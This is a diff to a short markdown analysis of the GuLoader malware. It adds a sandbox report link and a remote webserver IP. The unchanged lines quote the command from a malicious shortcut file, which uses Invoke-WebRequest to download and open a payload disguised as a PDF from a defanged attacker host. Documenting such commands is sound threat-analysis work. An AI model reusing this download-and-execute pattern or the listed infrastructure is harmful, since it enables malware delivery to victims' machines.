@@ -1,3 +1,8 @@
+# GuLoader Analysis
+
+### Dynamic Analysis
+https://tria.ge/230310-r1hssafh8w/behavioral2
+
 ### Malicious Shortcut Doc065754.lnk executes the following command
 
 ```
@@ -7,6 +12,10 @@ C:\Windows\Tasks\Tepoler.vbs;
 Invoke-WebRequest http[:]//0xC2.11808979/sara/info.pdf -OutFile C:\Users\Public\info1.pdf; 
 C:\Users\Public\info1.pdf
 ```
+
+### Remote webserver IP
+
+`194.180.48.211`
 
 ### Vejlensisk90.vbs executes the following Deobfuscated PS Script
 
